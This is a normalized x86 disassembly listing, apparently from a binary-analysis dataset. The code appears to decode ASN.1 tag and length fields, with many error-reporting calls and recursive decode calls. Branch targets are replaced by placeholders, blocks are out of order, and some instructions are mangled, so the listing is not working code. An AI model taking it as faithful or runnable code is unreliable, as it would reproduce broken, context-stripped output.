mov ebp [ esp + 0x4c ]
push ebp
mov ebp [ esp + 0x4c ]
push ebp
push ecx
push eax
lea eax [ esp + 0x24 ]
push edx
lea ecx [ esp + 0x27 ]
push eax
lea edx [ esp + 0x58 ]
push ecx
push edx
push 0x0
lea eax [ esp + 0x5c ]
push 0x0
push eax
call sub_100323f0
add esp 0x2c
test eax eax
jne r-xdata
mov ecx [ esp + 0x4c ]
mov edx [ esp + 0x38 ]
push ecx
push 0x0
push eax
mov eax [ esp + 0x40 ]
push edx
push eax
push esi
call sub_100316f0
add esp 0x18
pop edi
pop esi
pop ebp
pop ebx
add esp 0x1c
retn
xor ecx ecx
cmp eax 0x1e
jg r-xdata
push 0xda
push r--data
push 0x8b
jmp r-xdata
pop edi
pop esi
pop ebp
or eax 0xffffffff
pop ebx
add esp 0x1c
retn
mov eax [ ebx + 0x18 ]
push eax
push r--data
push 0x2
call sub_1001e1a0
add esp 0xc
mov ecx [ ebx + 0x18 ]
mov edx [ eax + 0xc ]
push ecx
push r--data
push edx
push r--data
push 0x4
call sub_1001e1a0
add esp 0x14
xor eax eax
pop edi
pop esi
pop ebp
pop ebx
add esp 0x1c
retn
test eax eax
je r-xdata
mov cl [ esp + 0x3c ]
mov [ ebp ] cl
mov al [ ecx ]
mov cl [ ebx + 0x4 ]
and al 0x20
or al cl
mov [ ebp ] al
push 0x121
push r--data
push 0x3a
jmp r-xdata
cmp eax 0xffffffff
jne r-xdata
push 0x104
push r--data
push 0x3a
jmp r-xdata
mov ecx [ esp + 0x4c ]
mov edx [ esp + 0x44 ]
push ecx
push 0x1
push edx
push eax
mov eax [ esp + 0x48 ]
lea ecx [ esp + 0x24 ]
push eax
push ecx
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
call sub_100323f0
add esp 0x2c
test eax eax
jne r-xdata
cmp edi [ ebx + 0xc ]
jne r-xdata
mov ebp [ esp + 0x4c ]
push 0x13c
push r--data
push 0x3a
jmp r-xdata
mov ecx [ esp + 0x14 ]
test edi edi
je r-xdata
pop edi
pop esi
pop ebp
or eax eax
pop ebx
add esp 0x1c
retn
mov ecx [ esp + 0x30 ]
push edi
push 0x0
push 0x0
push eax
mov eax [ esp + 0x48 ]
push ebx
push eax
push esi
push ecx
call sub_10031af0
add esp 0x20
pop edi
pop esi
pop ebp
pop ebx
add esp 0x1c
retn
mov al [ esp + 0x48 ]
test al al
je r-xdata
mov ecx [ eax * 4 + r--data ]
jmp r-xdata
push 0x130
push r--data
push 0x3a
jmp r-xdata
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
add esp 0x1c
retn
mov ecx [ esp + 0x14 ]
pop edi
pop esi
pop ebp
or eax eax
pop ebx
add esp 0x1c
retn
mov esi [ esp + 0x30 ]
push ebx
push edi
push esi
call sub_100505d0
mov ecx [ esp + 0x40 ]
mov eax [ esp + 0x20 ]
add esp 0xc
mov [ ecx ] eax
mov eax [ esp + 0x1c ]
test eax eax
je r-xdata
mov al [ esp + 0x48 ]
test al al
je r-xdata
test eax eax
jg r-xdata
mov eax [ ebx + 0xc ]
inc edi
add esi 0x14
cmp edi eax
jl r-xdata
mov dl [ esp + 0x40 ]
mov eax [ esp + 0x38 ]
mov [ esp + 0x48 ] dl
test [ edi + 0x4 ] 0x4
je r-xdata
push 0xe4
push r--data
push 0x8c
jmp r-xdata
pop edi
pop esi
pop ebp
or eax 0xffffffff
pop ebx
add esp 0x1c
retn
test [ ebx + 0x4 ] ecx
jne r-xdata
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
add esp 0x1c
retn
push ebx
push esi
push 0x5
call eax
add esp 0xc
test eax eax
je r-xdata
push 0x161
push r--data
push 0x8f
jmp r-xdata
mov edx [ esp + 0x30 ]
push ebx
push edx
call sub_10033860
add esp 0x8
or eax 0xffffffff
pop edi
pop esi
pop ebp
pop ebx
add esp 0x1c
retn
push 0x152
push r--data
mov [ esp + 0x28 ] esi
push 0x3a
jmp r-xdata
mov ecx [ esp + 0x30 ]
push esi
push ecx
call sub_100507f0
mov edx [ esp + 0x40 ]
push ebp
push 0x1
push esi
lea ecx [ esp + 0x28 ]
push edx
push ecx
push eax
call sub_100316f0
add esp 0x20
cmp eax 0xffffffff
jne r-xdata
cmp [ esi ] 0x0
jne r-xdata
push 0x18b
push r--data
push 0x95
jmp r-xdata
mov eax [ esi ]
mov edx [ esp + 0x3c ]
sub eax ecx
mov [ esp + 0x48 ] 0x1
add eax edx
mov [ esp + 0x38 ] eax
jmp r-xdata
mov edx [ esp + 0x1c ]
test edx edx
je r-xdata
push ebx
push esi
call sub_10033160
add esp 0x8
test eax eax
jne r-xdata
mov dl [ esp + 0x13 ]
mov esi [ esp + 0x30 ]
test dl dl
jne r-xdata
mov edx [ ebx + 0x8 ]
mov [ esp + 0x18 ] 0x0
mov [ esp + 0x3c ] edx
mov edx [ ebx + 0xc ]
test edx edx
jle r-xdata
push ebx
push esi
push 0x4
call edx
add esp 0xc
test eax eax
je r-xdata
mov eax [ esp + 0x38 ]
mov ecx [ esp + 0x14 ]
push 0x192
push r--data
push 0x3a
jmp r-xdata
mov dl [ esp + 0x40 ]
test dl dl
je r-xdata
mov eax [ esp + 0x3c ]
mov ecx [ esp + 0x30 ]
push 0x1
push eax
push ecx
call sub_10050810
mov esi eax
add esp 0xc
test esi esi
je r-xdata
mov eax [ esp + 0x38 ]
mov ecx [ esp + 0x14 ]
mov dl [ esp + 0x48 ]
test dl dl
jne r-xdata
cmp eax 0x2
jl r-xdata
mov eax [ esp + 0x30 ]
push ebx
push eax
call sub_10033860
mov eax [ esp + 0x28 ]
add esp 0x8
test eax eax
je r-xdata
mov edx [ esp + 0x30 ]
push esi
push edx
call sub_100507f0
mov ecx [ esp + 0x1c ]
mov ebp eax
mov eax [ esp + 0x40 ]
add esp 0x8
test eax eax
je r-xdata
mov edx [ esp + 0x18 ]
mov eax [ ebx + 0xc ]
mov edi [ esp + 0x30 ]
cmp edx eax
jge r-xdata
test eax eax
je r-xdata
push 0x1d5
push r--data
push 0x89
jmp r-xdata
cmp [ ecx ] 0x0
jne r-xdata
cmp eax 0x2
mov edi ecx
jl r-xdata
mov edx [ esp + 0x34 ]
push ebx
mov eax [ edx ]
sub ecx eax
push ecx
push eax
push edi
call sub_100506e0
add esp 0x10
test eax eax
je r-xdata
mov eax [ esp + 0x3c ]
push 0x1
push eax
push edi
call sub_10050810
mov esi eax
add esp 0xc
test esi esi
je r-xdata
push 0x1dc
push r--data
push 0x94
jmp r-xdata
mov dl [ ecx + 0x1 ]
test dl dl
jne r-xdata
mov ecx [ ebx + 0xc ]
mov edx [ esp + 0x18 ]
dec ecx
cmp edx ecx
jne r-xdata
cmp [ ecx ] 0x0
jne r-xdata
mov ecx [ esp + 0x34 ]
mov eax [ esp + 0x14 ]
mov [ ecx ] eax
mov eax [ esp + 0x1c ]
test eax eax
je r-xdata
test [ esi ] 0x1
je r-xdata
add ecx 0x2
mov [ esp + 0x14 ] ecx
jmp r-xdata
mov dl [ esi ]
and dl 0x1
mov [ esp + 0x24 ] dl
mov [ esp + 0x24 ] 0x0
jmp r-xdata
mov dl [ ecx + 0x1 ]
test dl dl
je r-xdata
mov edx [ esp + 0x30 ]
push ebx
push edx
push 0x5
call eax
add esp 0xc
test eax eax
jne r-xdata
push 0x1f4
push r--data
mov [ esp + 0x28 ] esi
push 0x79
jmp r-xdata
mov edi [ esp + 0x30 ]
push esi
push edi
call sub_100507f0
push esi
push eax
call sub_10033be0
mov esi [ esp + 0x4c ]
mov eax [ esp + 0x28 ]
mov ecx [ ebx + 0xc ]
add esp 0x10
add esi 0x14
inc eax
cmp eax ecx
mov [ esp + 0x3c ] esi
mov [ esp + 0x18 ] eax
jl r-xdata
mov [ esp + 0x20 ] esi
jmp r-xdata
cmp eax 0xffffffff
jne r-xdata
mov ecx [ esp + 0x4c ]
mov edx [ esp + 0x24 ]
push ecx
push edx
push esi
push eax
lea eax [ esp + 0x24 ]
push eax
push ebp
call sub_100316f0
add esp 0x18
test eax eax
je r-xdata
mov dl [ esp + 0x40 ]
add ecx 0x2
test dl dl
mov [ esp + 0x14 ] ecx
jne r-xdata
mov ecx [ esp + 0x14 ]
mov ecx [ esp + 0x14 ]
mov eax [ esp + 0x38 ]
sub edi ecx
add eax edi
mov [ esp + 0x38 ] eax
push esi
push ebp
call sub_10033be0
mov eax [ esp + 0x40 ]
mov ecx [ esp + 0x1c ]
add esp 0x8
jmp r-xdata
sub edi ecx
mov [ esp + 0x40 ] 0x0
add eax edi
mov [ esp + 0x38 ] eax
push 0x1ab
push r--data
push 0x9f
jmp r-xdata
jmp r-xdata
mov edx [ esp + 0x18 ]
mov edi [ esp + 0x3c ]
mov esi [ ebx + 0xc ]
inc edx
add edi 0x14
cmp edx esi
mov [ esp + 0x18 ] edx
mov [ esp + 0x3c ] edi
jge r-xdata
sub_100316f0
push ebx
push ebp
mov ebp [ esp + 0xc ]
push esi
test ebp ebp
push edi
je r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
retn
mov edi [ esp + 0x20 ]
mov ecx [ esp + 0x18 ]
mov eax [ edi ]
mov edx [ ecx ]
test al 0x10
mov [ esp + 0x14 ] edx
je r-xdata
mov edx [ esp + 0x28 ]
mov eax [ esp + 0x24 ]
push edx
mov edx [ esp + 0x20 ]
push eax
push edi
push edx
push ecx
push ebp
call sub_10031860
add esp 0x18
pop edi
pop esi
pop ebp
pop ebx
retn
mov ebx [ esp + 0x28 ]
mov ecx [ esp + 0x24 ]
mov edx [ edi + 0x4 ]
push ebx
and eax 0xc0
push ecx
push eax
mov eax [ esp + 0x28 ]
push edx
lea ecx [ esp + 0x24 ]
push eax
lea edx [ esp + 0x3c ]
push ecx
lea eax [ esp + 0x3c ]
push edx
push eax
push 0x0
lea ecx [ esp + 0x40 ]
push 0x0
push ecx
call sub_100323f0
mov esi [ esp + 0x40 ]
add esp 0x2c
test eax eax
jne r-xdata
cmp eax 0xffffffff
jne r-xdata
push 0x232
jmp r-xdata
mov al [ esp + 0x28 ]
test al al
jne r-xdata
pop edi
pop esi
pop ebp
or eax eax
pop ebx
retn
push r--data
push 0x3a
mov edx [ esp + 0x1c ]
push ebx
push 0x0
push edi
lea eax [ esp + 0x20 ]
push edx
push eax
push ebp
call sub_10031860
add esp 0x18
test eax eax
jne r-xdata
push 0x23a
push r--data
push 0x78
jmp r-xdata
mov eax [ esp + 0x14 ]
mov ecx [ esp + 0x1c ]
mov dl [ esp + 0x24 ]
sub esi eax
add ecx esi
test dl dl
mov [ esp + 0x1c ] ecx
je r-xdata
push 0x242
push 0x84
push 0xd
call sub_1001de60
add esp 0x14
test ecx ecx
je r-xdata
cmp ecx 0x2
jl r-xdata
mov ecx [ esp + 0x18 ]
pop edi
pop esi
pop ebp
mov [ ecx ] eax
mov eax 0x1
pop ebx
retn
push 0x258
push r--data
push 0x77
push 0x24d
push r--data
push 0x89
jmp r-xdata
cmp [ eax ] 0x0
jne r-xdata
push 0x84
push 0xd
call sub_1001de60
add esp 0x14
push edi
push ebp
call sub_10033be0
add esp 0x8
xor eax eax
pop edi
pop esi
pop ebp
pop ebx
retn
mov cl [ eax + 0x1 ]
test cl cl
jne r-xdata
add eax 0x2
sub_10031860
push ebx
push ebp
mov ebp [ esp + 0xc ]
push esi
test ebp ebp
push edi
jne r-xdata
mov edi [ esp + 0x20 ]
mov edx [ esp + 0x18 ]
mov eax [ edi ]
mov edx [ edx ]
mov ecx eax
mov [ esp + 0x14 ] edx
and ecx 0xc0
test al 0x6
je r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
retn
test al 0x8
je r-xdata
test al 0x8
je r-xdata
mov ecx [ esp + 0x28 ]
mov edx [ esp + 0x24 ]
push ecx
push edx
push 0x0
push 0xffffffff
call [ edi + 0x10 ]
push eax
mov eax [ esp + 0x30 ]
lea ecx [ esp + 0x28 ]
push eax
push ecx
push ebp
call sub_10030f20
add esp 0x20
test eax eax
jne r-xdata
mov edx [ esp + 0x28 ]
mov eax [ esp + 0x24 ]
push edx
push eax
push ecx
mov ecx [ edi + 0x4 ]
push ecx
call [ edi + 0x10 ]
mov edx [ esp + 0x2c ]
push eax
lea eax [ esp + 0x28 ]
push edx
push eax
push ebp
call sub_10030f20
add esp 0x20
test eax eax
jne r-xdata
movsx eax al
and eax 0x2
xor ecx ecx
or al 0x20
shr eax 0x1
mov eax [ edi + 0x4 ]
jmp r-xdata
cmp eax 0xffffffff
jne r-xdata
push 0x2ec
push 0x2de
jmp r-xdata
cmp eax 0xffffffff
jne r-xdata
push 0x292
push r--data
push 0x3a
push 0x83
push 0xd
call sub_1001de60
add esp 0x14
xor eax eax
pop edi
pop esi
pop ebp
pop ebx
retn
mov ebx [ esp + 0x28 ]
mov edx [ esp + 0x24 ]
push ebx
push edx
push ecx
push eax
mov eax [ esp + 0x2c ]
lea ecx [ esp + 0x24 ]
push eax
push ecx
lea edx [ esp + 0x40 ]
push 0x0
push edx
push 0x0
lea eax [ esp + 0x40 ]
push 0x0
push eax
call sub_100323f0
add esp 0x2c
test eax eax
jne r-xdata
mov eax [ esp + 0x14 ]
pop edi
pop esi
pop ebp
or eax eax
pop ebx
retn
push r--data
push 0x3a
mov esi [ ebp ]
test esi esi
jne r-xdata
pop edi
pop esi
pop ebp
or eax eax
pop ebx
retn
push esi
call sub_1001e7b0
add esp 0x4
test eax eax
jle r-xdata
call sub_1001e3c0
mov [ ebp ] eax
jmp r-xdata
cmp [ ebp ] 0x0
jne r-xdata
push esi
call sub_1001e6e0
mov [ esp + 0x28 ] eax
call [ edi + 0x10 ]
lea ecx [ esp + 0x28 ]
push eax
push ecx
call sub_10033860
push esi
call sub_1001e7b0
add esp 0x10
test eax eax
jg r-xdata
mov ecx [ esp + 0x1c ]
test ecx ecx
jle r-xdata
push 0x2a9
push r--data
push 0x41
jmp r-xdata
mov al [ esp + 0x28 ]
test al al
je r-xdata
mov eax [ esp + 0x14 ]
cmp ecx 0x2
mov esi eax
jl r-xdata
push 0x83
push 0xd
call sub_1001de60
add esp 0x14
push edi
push ebp
call sub_10033be0
add esp 0x8
xor eax eax
pop edi
pop esi
pop ebp
pop ebx
retn
push 0x2d2
push r--data
push 0x89
jmp r-xdata
push ebx
push 0x0
push 0x0
push 0xffffffff
mov [ esp + 0x34 ] 0x0
call [ edi + 0x10 ]
mov edx [ esp + 0x2c ]
push eax
lea eax [ esp + 0x28 ]
push edx
lea ecx [ esp + 0x3c ]
push eax
push ecx
call sub_10030f20
add esp 0x20
test eax eax
je r-xdata
cmp [ eax ] 0x0
jne r-xdata
push 0x2c5
jmp r-xdata
mov edx [ esp + 0x14 ]
mov ecx [ esp + 0x1c ]
mov eax [ ebp ]
sub esi edx
mov edx [ esp + 0x24 ]
add ecx esi
push edx
push eax
mov [ esp + 0x24 ] ecx
call sub_1001e6c0
add esp 0x8
test eax eax
je r-xdata
mov cl [ eax + 0x1 ]
test cl cl
je r-xdata
push 0x2cc
push r--data
push 0x41
jmp r-xdata
mov ecx [ esp + 0x1c ]
test ecx ecx
jle r-xdata
mov cl [ esp + 0x28 ]
add eax 0x2
test cl cl
mov [ esp + 0x14 ] eax
jne r-xdata
jmp r-xdata
mov edx [ esp + 0x18 ]
pop edi
pop esi
pop ebp
mov [ edx ] eax
mov eax 0x1
pop ebx
retn
push 0x2b8
push r--data
push 0x9f
jmp r-xdata
sub_10031af0
mov eax 0x20
call sub_1001d0d0
mov eax [ esp + 0x24 ]
push ebx
push ebp
push esi
test eax eax
push edi
mov [ esp + 0x13 ] 0x0
jne r-xdata
mov eax [ esp + 0x40 ]
cmp [ eax ] 0x5
jne r-xdata
push 0x309
push r--data
push 0x7d
push 0x6c
push 0xd
call sub_1001de60
add esp 0x14
xor eax eax
pop edi
pop esi
pop ebp
pop ebx
add esp 0x20
retn
mov eax [ eax + 0x4 ]
mov esi [ esp + 0x44 ]
mov [ esp + 0x14 ] eax
mov eax [ esp + 0x44 ]
or esi 0xffffffff
mov [ esp + 0x14 ] eax
jmp r-xdata
cmp esi 0xffffffff
jne r-xdata
test esi esi
jl r-xdata
mov ebp [ esp + 0x50 ]
mov edi [ esp + 0x3c ]
mov ebx [ esp + 0x4c ]
cmp eax 0xfffffffc
jne r-xdata
mov eax [ esp + 0x48 ]
mov esi eax
xor eax eax
jmp r-xdata
test bl bl
je r-xdata
push 0x31c
push r--data
push 0x7f
push 0x6c
push 0xd
call sub_1001de60
add esp 0x14
xor eax eax
pop edi
pop esi
pop ebp
pop ebx
add esp 0x20
retn
cmp eax 0xffffffff
jne r-xdata
push 0x33c
mov edx [ esp + 0x38 ]
push ebp
push ebx
push eax
mov ecx [ edx ]
push esi
lea edx [ esp + 0x4c ]
mov [ esp + 0x4c ] ecx
push edi
lea eax [ esp + 0x58 ]
push edx
lea ecx [ esp + 0x34 ]
push eax
push ecx
push 0x0
lea edx [ esp + 0x3c ]
push 0x0
push edx
call sub_100323f0
xor edx edx
add esp 0x2c
cmp eax edx
jne r-xdata
mov eax [ esp + 0x38 ]
push ebp
push 0x0
push 0x0
mov ecx [ eax ]
push 0xffffffff
lea edx [ esp + 0x4c ]
push edi
push edx
mov [ esp + 0x54 ] ecx
push 0x0
lea eax [ esp + 0x6c ]
push 0x0
lea ecx [ esp + 0x34 ]
push eax
push ecx
push 0x0
call sub_100323f0
add esp 0x2c
test eax eax
jne r-xdata
push 0x322
push r--data
push 0x7e
push 0x6c
push 0xd
call sub_1001de60
add esp 0x14
xor eax eax
pop edi
pop esi
pop ebp
pop ebx
add esp 0x20
retn
mov eax [ esp + 0x14 ]
mov [ esp + 0x48 ] edx
cmp eax 0x10
je r-xdata
pop edi
pop esi
pop ebp
or eax eax
pop ebx
add esp 0x20
retn
mov al [ esp + 0x50 ]
test al al
je r-xdata
push 0x32b
jmp r-xdata
cmp eax 0xfffffffd
jne r-xdata
cmp eax 0x11
je r-xdata
mov eax [ esp + 0x14 ]
mov eax 0xfffffffd
mov [ esp + 0x14 ] eax
jmp r-xdata
push r--data
push 0x3a
push 0x6c
push 0xd
call sub_1001de60
add esp 0x14
xor eax eax
pop edi
pop esi
pop ebp
pop ebx
add esp 0x20
retn
mov al [ esp + 0x44 ]
test al al
jne r-xdata
cmp ebp edx
je r-xdata
cmp eax 0xfffffffd
je r-xdata
mov ecx [ esp + 0x38 ]
mov al [ esp + 0x1c ]
test al al
mov ebx [ ecx ]
je r-xdata
push 0x351
push r--data
push 0x9c
push 0x6c
push 0xd
call sub_1001de60
add esp 0x14
xor eax eax
pop edi
pop esi
pop ebp
pop ebx
add esp 0x20
retn
mov [ ebp ] 0x0
mov al [ esp + 0x44 ]
test al al
je r-xdata
mov eax [ esp + 0x18 ]
mov ecx [ esp + 0x3c ]
mov esi eax
mov [ esp + 0x28 ] edx
sub esi ebx
add esi ecx
add ecx eax
mov [ esp + 0x3c ] ecx
mov edi [ esp + 0x18 ]
mov [ esp + 0x50 ] al
mov eax [ esp + 0x3c ]
cmp edi edx
mov [ esp + 0x4c ] eax
mov ebp 0x1
jle r-xdata
mov eax [ esp + 0x3c ]
mov esi [ esp + 0x18 ]
mov ebx eax
add eax esi
mov [ esp + 0x3c ] eax
jmp r-xdata
mov eax [ esp + 0x1c ]
mov ecx [ esp + 0x18 ]
push edx
push edx
mov [ esp + 0x2c ] edx
mov [ esp + 0x34 ] edx
mov [ esp + 0x30 ] edx
push 0xffffffff
push eax
lea edx [ esp + 0x4c ]
push ecx
lea eax [ esp + 0x38 ]
push edx
push eax
call sub_100321c0
add esp 0x1c
test eax eax
jne r-xdata
mov al [ esp + 0x13 ]
test al al
je r-xdata
mov edx [ esp + 0x38 ]
mov ecx [ esp + 0x3c ]
mov [ esp + 0x48 ] 0x1
mov [ edx ] ecx
push 0x469
push r--data
push 0x89
push 0xbe
push 0xd
call sub_1001de60
add esp 0x14
jmp r-xdata
cmp edi 0x2
jl r-xdata
mov eax [ esp + 0x40 ]
mov edx [ esp + 0x14 ]
lea ecx [ esp + 0x13 ]
push eax
mov eax [ esp + 0x38 ]
push ecx
push edx
push esi
push ebx
push eax
call sub_10031ee0
add esp 0x18
test eax eax
je r-xdata
mov esi [ esp + 0x24 ]
lea edx [ esp + 0x24 ]
lea ecx [ esi + 0x1 ]
push ecx
push edx
call sub_1001dd90
add esp 0x8
test eax eax
jne r-xdata
mov [ esp + 0x13 ] 0x1
jmp r-xdata
mov eax [ esp + 0x48 ]
pop edi
pop esi
pop ebp
pop ebx
add esp 0x20
retn
mov eax [ esp + 0x28 ]
test eax eax
je r-xdata
push edx
push edx
mov esi eax
push edx
push 0xffffffff
lea eax [ esp + 0x5c ]
push edi
push eax
lea ecx [ esp + 0x68 ]
push edx
push ecx
push edx
push edx
lea edx [ esp + 0x48 ]
push edx
call sub_100323f0
add esp 0x2c
test eax eax
je r-xdata
cmp [ eax ] 0x0
jne r-xdata
mov eax [ esp + 0x28 ]
mov [ eax + esi ] 0x0
mov ebx [ esp + 0x28 ]
mov [ esp + 0x13 ] 0x1
jmp r-xdata
push 0x379
push r--data
push 0x41
push 0x6c
push 0xd
call sub_1001de60
add esp 0x14
xor eax eax
pop edi
pop esi
pop ebp
pop ebx
add esp 0x20
retn
push eax
call sub_1001d740
add esp 0x4
push 0x45e
push r--data
push 0x3a
push 0xbe
push 0xd
call sub_1001de60
add esp 0x14
jmp r-xdata
mov al [ esp + 0x50 ]
test al al
je r-xdata
mov cl [ eax + 0x1 ]
test cl cl
jne r-xdata
mov eax [ esp + 0x4c ]
mov ecx [ esp + 0x20 ]
add eax ecx
mov [ esp + 0x4c ] eax
mov eax [ esp + 0x4c ]
inc ebp
jmp r-xdata
add eax 0x2
dec ebp
mov [ esp + 0x4c ] eax
je r-xdata
cmp ebp edx
je r-xdata
sub esi eax
add edi esi
xor edx edx
mov [ esp + 0x3c ] eax
sub eax ebx
mov esi eax
jmp r-xdata
sub edi 0x2
jmp r-xdata
cmp edi edx
jg r-xdata
sub_10031ee0
mov eax 0xc
call sub_1001d0d0
mov ecx [ esp + 0x24 ]
push ebx
xor ebx ebx
mov eax [ ecx + 0x10 ]
mov [ esp + 0x8 ] ebx
cmp eax ebx
mov [ esp + 0x4 ] ebx
mov [ esp + 0xc ] ebx
je r-xdata
mov eax [ ecx + 0x4 ]
push ebp
push esi
push edi
mov edi [ esp + 0x2c ]
cmp eax 0xfffffffc
jne r-xdata
mov eax [ eax + 0x14 ]
cmp eax ebx
je r-xdata
mov ebp [ esp + 0x20 ]
mov esi [ esp + 0x20 ]
mov eax [ esi ]
cmp eax ebx
jne r-xdata
mov edx [ esp + 0x20 ]
push ecx
mov ecx [ esp + 0x28 ]
push ecx
mov ecx [ esp + 0x24 ]
push edx
mov edx [ esp + 0x24 ]
push ecx
mov ecx [ esp + 0x24 ]
push edx
push ecx
call eax
add esp 0x18
pop ebx
add esp 0xc
retn
mov eax edi
sub eax 0x102
je r-xdata
je r-xdata
mov [ esp + 0x10 ] eax
mov ebp eax
call sub_1002f070
cmp eax ebx
mov [ esp + 0x10 ] eax
je r-xdata
mov eax [ esp + 0x28 ]
lea ecx [ esp + 0x24 ]
push eax
push ecx
push ebp
call sub_1002f290
add esp 0xc
test eax eax
je r-xdata
sub eax 0x8
je r-xdata
lea eax [ edi - 0x1 ]
cmp eax 0x5
ja r-xdata
mov [ esp + 0x14 ] esi
add ebp 0x4
jmp r-xdata
push ebx
push edi
push ebp
call sub_1004d940
add esp 0xc
mov eax [ esp + 0x10 ]
push eax
call sub_1002f080
mov eax [ esp + 0x18 ]
add esp 0x4
test eax eax
je r-xdata
mov ebp eax
mov [ esi ] ebp
jmp r-xdata
mov eax [ ebp ]
mov edx [ eax + 0x4 ]
and edx 0x100
or edx edi
mov [ eax + 0x4 ] edx
cmp edi 0x1e
jne r-xdata
jmp [ eax * 4 + jump_table_100321a0 ]
cmp edi 0xa
jg r-xdata
mov eax [ esp + 0x18 ]
pop edi
pop esi
pop ebp
pop ebx
add esp 0xc
retn
mov [ eax ] 0x0
cmp edi [ ebp ]
je r-xdata
pop edi
mov [ esp + 0x14 ] 0x1
mov eax [ esp + 0x14 ]
pop esi
pop ebp
pop ebx
add esp 0xc
retn
cmp edi 0x5
jne r-xdata
cmp edi 0x1c
jne r-xdata
test [ esp + 0x28 ] 0x1
je r-xdata
mov edx [ esp + 0x28 ]
lea eax [ esp + 0x24 ]
push edx
push eax
push ebp
call sub_10030720
add esp 0xc
test eax eax
je r-xdata
cmp [ esp + 0x28 ] ebx
je r-xdata
cmp [ esp + 0x28 ] 0x1
je r-xdata
mov eax [ esp + 0x28 ]
lea ecx [ esp + 0x24 ]
push eax
push ecx
push ebp
call sub_10050990
add esp 0xc
test eax eax
je r-xdata
mov [ eax + 0x4 ] 0x0
mov esi [ ebp ]
cmp esi ebx
jne r-xdata
test [ esp + 0x28 ] 0x3
je r-xdata
push 0x3f8
push r--data
push 0xd2
jmp r-xdata
jmp r-xdata
mov [ ebp ] 0x1
jmp r-xdata
push 0x3be
push r--data
push 0x90
mov edx [ esp + 0x24 ]
xor ecx ecx
mov cl [ edx ]
mov [ ebp ] ecx
jmp r-xdata
push 0x3c8
push r--data
push 0x6a
jmp r-xdata
jmp r-xdata
mov [ esi + 0x4 ] edi
push edi
call sub_1002edc0
mov esi eax
add esp 0x4
cmp esi ebx
jne r-xdata
push 0x3fe
push r--data
push 0xd3
jmp r-xdata
push 0xcc
push 0xd
call sub_1001de60
add esp 0x14
mov eax [ esp + 0x10 ]
test eax eax
je r-xdata
mov ecx [ esp + 0x28 ]
mov edx [ esp + 0x24 ]
push ecx
push edx
push esi
call sub_1002ec90
add esp 0xc
test eax eax
jne r-xdata
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
mov [ ebp ] esi
jmp r-xdata
push 0x408
push r--data
push 0x41
jmp r-xdata
push 0x420
push r--data
push 0x41
push 0xcc
push 0xd
call sub_1001de60
push esi
call sub_1002ee10
add esp 0x18
mov [ ebp ] 0x0
jmp r-xdata
mov edx [ esp + 0x24 ]
mov eax [ esp + 0x28 ]
mov [ esi + 0x8 ] edx
mov [ esi ] eax
mov [ ebx ] 0x0
jmp r-xdata
push eax
call sub_1001d740
add esp 0x4
mov ebx [ esp + 0x30 ]
cmp [ ebx ] 0x0
je r-xdata
sub_100321c0
mov eax 0x14
call sub_1001d0d0
mov ecx [ esp + 0x1c ]
push ebx
mov bl [ esp + 0x28 ]
push ebp
mov eax [ ecx ]
push esi
push edi
mov edi [ esp + 0x28 ]
and bl 0x1
mov [ esp + 0x14 ] eax
test edi edi
mov [ esp + 0x34 ] bl
jne r-xdata
mov esi [ esp + 0x30 ]
test esi esi
jle r-xdata
mov dl bl
test dl dl
jne r-xdata
mov cl [ esp + 0x34 ]
test cl cl
je r-xdata
cmp esi 0x2
mov [ esp + 0x20 ] eax
jl r-xdata
mov edx [ esp + 0x30 ]
pop edi
add eax edx
pop esi
mov [ ecx ] eax
pop ebp
mov eax 0x1
pop ebx
add esp 0x14
retn
mov ecx [ esp + 0x2c ]
pop edi
pop esi
pop ebp
mov [ ecx ] eax
mov eax 0x1
pop ebx
add esp 0x14
retn
push 0x4ba
push r--data
push 0x89
push 0x6a
push 0xd
call sub_1001de60
add esp 0x14
mov ebx [ esp + 0x3c ]
mov ebp [ esp + 0x38 ]
push 0x0
push 0x0
push ebx
push ebp
lea eax [ esp + 0x24 ]
push esi
lea ecx [ esp + 0x27 ]
push eax
lea edx [ esp + 0x34 ]
push ecx
push edx
push 0x0
lea eax [ esp + 0x3c ]
push 0x0
push eax
call sub_100323f0
add esp 0x2c
test eax eax
je r-xdata
cmp [ eax ] 0x0
jne r-xdata
push 0x4a3
push r--data
push 0x3a
push 0x6a
push 0xd
call sub_1001de60
add esp 0x14
xor eax eax
pop edi
pop esi
pop ebp
pop ebx
add esp 0x14
retn
mov al [ esp + 0x13 ]
test al al
je r-xdata
mov cl [ eax + 0x1 ]
test cl cl
je r-xdata
mov eax [ esp + 0x18 ]
test eax eax
je r-xdata
mov eax [ esp + 0x40 ]
cmp eax 0x5
jge r-xdata
mov cl [ esp + 0x34 ]
add eax 0x2
test cl cl
mov [ esp + 0x14 ] eax
jne r-xdata
mov eax [ esp + 0x14 ]
test edi edi
mov ebx eax
je r-xdata
push 0x4ad
push r--data
push 0xc5
push 0x6a
push 0xd
call sub_1001de60
add esp 0x14
xor eax eax
pop edi
pop esi
pop ebp
pop ebx
add esp 0x14
retn
mov ecx [ esp + 0x1c ]
mov edx [ esp + 0x18 ]
inc eax
push eax
push ebx
push ebp
push ecx
lea eax [ esp + 0x24 ]
push edx
push eax
push edi
call sub_100321c0
add esp 0x1c
test eax eax
je r-xdata
push 0x499
push r--data
push 0x9f
push 0x6a
push 0xd
call sub_1001de60
add esp 0x14
xor eax eax
pop edi
pop esi
pop ebp
pop ebx
add esp 0x14
retn
jmp r-xdata
mov eax [ esp + 0x14 ]
add eax ebx
mov [ esp + 0x14 ] eax
jmp r-xdata
mov ebp [ edi ]
lea ecx [ eax + ebp ]
push ecx
push edi
call sub_1001dd90
add esp 0x8
test eax eax
je r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x14
retn
mov ecx [ esp + 0x20 ]
sub ecx eax
add esi ecx
test esi esi
mov [ esp + 0x30 ] esi
jle r-xdata
push 0x4c9
push r--data
push 0x41
push 0x8c
push 0xd
call sub_1001de60
add esp 0x14
xor eax eax
pop edi
pop esi
pop ebp
pop ebx
add esp 0x14
retn
mov edi [ edi + 0x4 ]
mov esi [ esp + 0x14 ]
mov ecx ebx
add edi ebp
mov edx ecx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
mov edi [ esp + 0x28 ]
